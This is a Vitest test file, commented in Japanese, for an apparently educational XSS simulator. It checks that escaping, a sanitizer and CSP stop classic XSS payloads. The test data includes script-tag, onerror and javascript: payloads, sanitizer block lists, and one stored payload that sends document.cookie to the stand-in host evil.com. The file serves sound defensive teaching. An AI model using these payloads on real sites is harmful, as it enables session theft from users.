/* XSS シミュレーター テスト */

import { describe, it, expect } from "vitest";
import {
  simulate, simulateAttack,
  escapeHtml, escapeJs, escapeUrl, escapeCss,
  extractTags, extractAttributes, extractProtocols,
  sanitize, renderInContext, detectExecution, checkCsp,
  noDefense, htmlEscapeOnly, fullEscape, withSanitizer, withCsp, fullDefense,
  mkPayload,
} from "../xss/engine.js";
import { PRESETS } from "../xss/presets.js";
import type { SimOp, SimStep, SimEvent, SanitizerConfig, CspPolicy } from "../xss/types.js";

describe("XSS Engine", () => {
  // ─── エスケープ関数 ───

  describe("エスケープ", () => {
    it("HTMLエスケープで<>\"'&が変換される", () => {
      expect(escapeHtml('<script>"test"&\'x\'</script>')).toBe(
        "&lt;script&gt;&quot;test&quot;&amp;&#x27;x&#x27;&lt;/script&gt;"
      );
    });

    it("JSエスケープで引用符がバックスラッシュ付きになる", () => {
      const result = escapeJs('";alert(1);//');
      expect(result).toContain('\\"');
      // エスケープ後は文字列から脱出できない
      expect(result.startsWith('\\"')).toBe(true);
    });

    it("JSエスケープで<>がエスケープされる", () => {
      const result = escapeJs("</script>");
      expect(result).toContain("\\x3c");
      expect(result).toContain("\\x3e");
    });

    it("URLエンコードで特殊文字がエンコードされる", () => {
      const result = escapeUrl("javascript:alert(1)");
      expect(result).not.toContain(":");
      expect(result).toContain("%3A");
    });

    it("CSSエスケープで特殊文字がエスケープされる", () => {
      const result = escapeCss("expression(alert(1))");
      expect(result).toContain("\\");
    });
  });

  // ─── HTML解析 ───

  describe("HTML解析", () => {
    it("タグが抽出される", () => {
      const tags = extractTags('<script>alert(1)</script><img src=x>');
      expect(tags).toContain("script");
      expect(tags).toContain("img");
    });

    it("属性が抽出される", () => {
      const attrs = extractAttributes('<img src=x onerror="alert(1)">');
      expect(attrs).toContain("src");
      expect(attrs).toContain("onerror");
    });

    it("プロトコルが抽出される", () => {
      const protos = extractProtocols('<a href="javascript:alert(1)">');
      expect(protos).toContain("javascript");
    });
  });

  // ─── サニタイザー ───

  describe("サニタイザー", () => {
    const mkConfig = (overrides?: Partial<SanitizerConfig>): SanitizerConfig => ({
      enabled: true,
      blockTags: ["script", "iframe"],
      blockAttributes: ["onerror", "onload"],
      blockProtocols: ["javascript"],
      whitelist: false,
      ...overrides,
    });

    it("無効時はそのまま通過する", () => {
      const steps: SimStep[] = [];
      const events: SimEvent[] = [];
      const result = sanitize('<script>alert(1)</script>', mkConfig({ enabled: false }), steps, events);
      expect(result.blocked).toBe(false);
      expect(result.result).toContain("<script>");
    });

    it("scriptタグがブロックされる", () => {
      const steps: SimStep[] = [];
      const events: SimEvent[] = [];
      const result = sanitize('<script>alert(1)</script>', mkConfig(), steps, events);
      expect(result.blocked).toBe(true);
      expect(result.result).not.toContain("<script>");
    });

    it("iframeタグがブロックされる", () => {
      const steps: SimStep[] = [];
      const events: SimEvent[] = [];
      const result = sanitize('<iframe src="evil.com"></iframe>', mkConfig(), steps, events);
      expect(result.blocked).toBe(true);
      expect(result.result).not.toContain("<iframe");
    });

    it("onerror属性がブロックされる", () => {
      const steps: SimStep[] = [];
      const events: SimEvent[] = [];
      const result = sanitize('<img src=x onerror="alert(1)">', mkConfig(), steps, events);
      expect(result.blocked).toBe(true);
      expect(result.result).not.toContain("onerror");
    });

    it("javascript:プロトコルがブロックされる", () => {
      const steps: SimStep[] = [];
      const events: SimEvent[] = [];
      const result = sanitize('<a href="javascript:alert(1)">', mkConfig(), steps, events);
      expect(result.blocked).toBe(true);
      expect(result.result).toContain("blocked:");
    });

    it("ホワイトリスト方式で許可タグ以外が除去される", () => {
      const steps: SimStep[] = [];
      const events: SimEvent[] = [];
      const config = mkConfig({ whitelist: true, allowTags: ["b", "i", "p"] });
      const result = sanitize('<b>太字</b><script>alert(1)</script>', config, steps, events);
      expect(result.blocked).toBe(true);
      expect(result.result).toContain("<b>");
      expect(result.result).not.toContain("<script>");
    });

    it("安全な入力はブロックされない", () => {
      const steps: SimStep[] = [];
      const events: SimEvent[] = [];
      const result = sanitize("Hello, World!", mkConfig(), steps, events);
      expect(result.blocked).toBe(false);
    });
  });

  // ─── レンダリング ───

  describe("レンダリング", () => {
    it("html_bodyコンテキスト", () => {
      const html = renderInContext("test", "html_body");
      expect(html).toContain("<div");
      expect(html).toContain("test");
    });

    it("html_attributeコンテキスト", () => {
      const html = renderInContext("test", "html_attribute");
      expect(html).toContain('value="test"');
    });

    it("href_attributeコンテキスト", () => {
      const html = renderInContext("https://example.com", "href_attribute");
      expect(html).toContain('href="https://example.com"');
    });

    it("script_stringコンテキスト", () => {
      const html = renderInContext("test", "script_string");
      expect(html).toContain('<script>var userInput = "test";</script>');
    });

    it("event_handlerコンテキスト", () => {
      const html = renderInContext("test", "event_handler");
      expect(html).toContain("onclick");
      expect(html).toContain("test");
    });
  });

  // ─── スクリプト実行検出 ───

  describe("スクリプト実行検出", () => {
    it("scriptタグの実行を検出する", () => {
      const steps: SimStep[] = [];
      const events: SimEvent[] = [];
      const html = '<div><script>alert(1)</script></div>';
      const result = detectExecution(html, "html_body", steps, events);
      expect(result.executed).toBe(true);
    });

    it("エスケープ済みscriptタグは実行されない", () => {
      const steps: SimStep[] = [];
      const events: SimEvent[] = [];
      const html = '<div>&lt;script&gt;alert(1)&lt;/script&gt;</div>';
      const result = detectExecution(html, "html_body", steps, events);
      expect(result.executed).toBe(false);
    });

    it("javascript: URLの実行を検出する", () => {
      const steps: SimStep[] = [];
      const events: SimEvent[] = [];
      const html = '<a href="javascript:alert(1)">link</a>';
      const result = detectExecution(html, "href_attribute", steps, events);
      expect(result.executed).toBe(true);
    });

    it("img onerrorの実行を検出する", () => {
      const steps: SimStep[] = [];
      const events: SimEvent[] = [];
      const html = '<div><img src=x onerror="alert(1)"></div>';
      const result = detectExecution(html, "html_body", steps, events);
      expect(result.executed).toBe(true);
    });
  });

  // ─── CSP ───

  describe("CSP", () => {
    const mkCsp = (overrides?: Partial<CspPolicy>): CspPolicy => ({
      enabled: true,
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'"],
      imgSrc: ["'self'"],
      connectSrc: ["'self'"],
      ...overrides,
    });

    it("CSP無効時はブロックしない", () => {
      const steps: SimStep[] = [];
      const events: SimEvent[] = [];
      const result = checkCsp(mkCsp({ enabled: false }), "<script>alert(1)</script>", steps, events);
      expect(result.blocked).toBe(false);
    });

    it("インラインスクリプトをブロックする", () => {
      const steps: SimStep[] = [];
      const events: SimEvent[] = [];
      const result = checkCsp(mkCsp(), "<script>alert(1)</script>", steps, events);
      expect(result.blocked).toBe(true);
    });

    it("unsafe-inlineがあればインラインを許可する", () => {
      const steps: SimStep[] = [];
      const events: SimEvent[] = [];
      const result = checkCsp(mkCsp({ scriptSrc: ["'self'", "'unsafe-inline'"] }), "<script>alert(1)</script>", steps, events);
      expect(result.blocked).toBe(false);
    });

    it("javascript:プロトコルをブロックする", () => {
      const steps: SimStep[] = [];
      const events: SimEvent[] = [];
      const result = checkCsp(mkCsp(), '<a href="javascript:alert(1)">', steps, events);
      expect(result.blocked).toBe(true);
    });
  });

  // ─── 統合テスト ───

  describe("攻撃シミュレーション", () => {
    it("防御なしでscriptタグが実行される", () => {
      const op: SimOp = {
        type: "attack", xssType: "reflected", context: "html_body",
        payload: mkPayload('<script>alert(1)</script>', "test", "test"),
        pageConfig: noDefense(),
      };
      const result = simulateAttack(op);
      expect(result.scriptExecuted).toBe(true);
    });

    it("HTMLエスケープでscriptタグがブロックされる", () => {
      const op: SimOp = {
        type: "attack", xssType: "reflected", context: "html_body",
        payload: mkPayload('<script>alert(1)</script>', "test", "test"),
        pageConfig: htmlEscapeOnly(),
      };
      const result = simulateAttack(op);
      expect(result.scriptExecuted).toBe(false);
      expect(result.renderedHtml).toContain("&lt;script&gt;");
    });

    it("サニタイザーでscriptタグが除去される", () => {
      const op: SimOp = {
        type: "attack", xssType: "reflected", context: "html_body",
        payload: mkPayload('<script>alert(1)</script>', "test", "test"),
        pageConfig: withSanitizer(),
      };
      const result = simulateAttack(op);
      expect(result.scriptExecuted).toBe(false);
    });

    it("CSPでインラインスクリプトがブロックされる", () => {
      // サニタイザー無しでCSPのみ有効な設定
      const cspOnly = {
        ...noDefense(),
        csp: {
          enabled: true,
          defaultSrc: ["'self'" as string],
          scriptSrc: ["'self'" as string],
          styleSrc: ["'self'" as string],
          imgSrc: ["'self'" as string],
          connectSrc: ["'self'" as string],
        },
      };
      const op: SimOp = {
        type: "attack", xssType: "reflected", context: "html_body",
        payload: mkPayload('<script>alert(1)</script>', "test", "test"),
        pageConfig: cspOnly,
      };
      const result = simulateAttack(op);
      expect(result.cspBlocked).toBe(true);
      expect(result.scriptExecuted).toBe(false);
    });

    it("フル防御でCookie窃取が防がれる", () => {
      const op: SimOp = {
        type: "attack", xssType: "stored", context: "html_body",
        payload: mkPayload('<script>fetch("https://evil.com/?c="+document.cookie)</script>', "test", "test"),
        pageConfig: fullDefense(),
      };
      const result = simulateAttack(op);
      expect(result.cookieStolen).toBe(false);
    });

    it("javascript: URLがURLエンコードでブロックされる", () => {
      const op: SimOp = {
        type: "attack", xssType: "reflected", context: "href_attribute",
        payload: mkPayload("javascript:alert(1)", "test", "test"),
        pageConfig: { ...noDefense(), encoding: { ...noDefense().encoding, urlEncode: true } },
      };
      const result = simulateAttack(op);
      expect(result.scriptExecuted).toBe(false);
    });

    it("JSエスケープでscript_string脱出が防がれる", () => {
      const op: SimOp = {
        type: "attack", xssType: "reflected", context: "script_string",
        payload: mkPayload('";alert(1);//', "test", "test"),
        pageConfig: { ...noDefense(), encoding: { ...noDefense().encoding, jsEscape: true } },
      };
      const result = simulateAttack(op);
      expect(result.scriptExecuted).toBe(false);
    });

    it("防御勧告が生成される", () => {
      const op: SimOp = {
        type: "attack", xssType: "reflected", context: "html_body",
        payload: mkPayload('<script>alert(1)</script>', "test", "test"),
        pageConfig: noDefense(),
      };
      const result = simulateAttack(op);
      expect(result.mitigations.length).toBeGreaterThan(0);
    });

    it("安全な設定では「適切です」メッセージが出る", () => {
      const op: SimOp = {
        type: "attack", xssType: "reflected", context: "html_body",
        payload: mkPayload('<script>alert(1)</script>', "test", "test"),
        pageConfig: fullDefense(),
      };
      const result = simulateAttack(op);
      expect(result.mitigations.some(m => m.includes("適切"))).toBe(true);
    });
  });

  // ─── simulate関数 ───

  describe("simulate", () => {
    it("複数攻撃が実行される", () => {
      const ops: SimOp[] = [
        { type: "attack", xssType: "reflected", context: "html_body", payload: mkPayload("<script>alert(1)</script>", "t", "t"), pageConfig: noDefense() },
        { type: "attack", xssType: "reflected", context: "html_body", payload: mkPayload("<script>alert(2)</script>", "t", "t"), pageConfig: htmlEscapeOnly() },
      ];
      const r = simulate(ops);
      expect(r.results).toHaveLength(2);
      expect(r.results[0].scriptExecuted).toBe(true);
      expect(r.results[1].scriptExecuted).toBe(false);
    });
  });

  // ─── プリセット ───

  describe("プリセット", () => {
    it("全プリセットがエラーなく実行できる", () => {
      for (const preset of PRESETS) {
        const ops = preset.build();
        const r = simulate(ops);
        expect(r.results.length).toBeGreaterThan(0);
      }
    });

    it("全プリセットにnameとdescriptionがある", () => {
      for (const preset of PRESETS) {
        expect(preset.name.length).toBeGreaterThan(0);
        expect(preset.description.length).toBeGreaterThan(0);
      }
    });
  });
});
